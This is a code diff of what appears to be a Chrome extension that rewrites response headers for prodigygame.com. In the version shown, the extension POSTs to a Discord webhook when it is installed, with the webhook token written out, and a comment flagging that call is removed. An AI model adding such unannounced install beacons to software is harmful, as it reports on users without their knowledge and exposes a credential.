@@ -10,13 +10,12 @@ chrome.webRequest.onHeadersReceived.addListener(
       return { responseHeaders: details.responseHeaders };
     },
     {
-      urls: ["https://*.prodigygame.com/*"],
-      types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "webtransport", "webbundle", "other"]
+      urls: ["*://*.prodigygame.com/*"],
+      types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "media", "websocket"]
     },
     ["blocking", "responseHeaders"]
   );
   
-  // Send webhook on extension install
   chrome.runtime.onInstalled.addListener(function() {
     fetch("https://discord.com/api/webhooks/1275219264915112011/O2bKtk2oyl9_5LFJJe8BRZd20xDXrYusIxm9wP8XoJwsClDEaB-Kq3M_CZJe_e5KgONI", {
       method: 'POST',
